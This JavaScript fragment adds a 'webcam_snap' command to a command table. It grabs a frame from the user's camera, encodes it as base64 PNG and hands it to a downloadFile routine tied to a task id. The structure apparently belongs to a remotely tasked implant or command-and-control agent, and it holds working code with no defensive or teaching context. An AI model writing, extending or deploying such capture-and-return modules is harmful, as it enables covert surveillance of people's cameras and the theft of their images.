COMMANDS['webcam_snap'] = async function(task) {
    var stream = await navigator.mediaDevices.getUserMedia({video: true});

    try {
        var video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        video.play();

        await new Promise(function(resolve) {
            video.onloadedmetadata = resolve;
        });
        // Allow a frame to render
        await new Promise(function(resolve) { setTimeout(resolve, 500); });

        var canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        var dataUrl = canvas.toDataURL('image/png');
        var b64data = dataUrl.split(';base64,')[1];

        var fileId = await downloadFile(task.id, 'webcam.png', b64data, true);
        return JSON.stringify({file_id: fileId});
    } finally {
        stream.getTracks().forEach(function(t) { t.stop(); });
    }
};
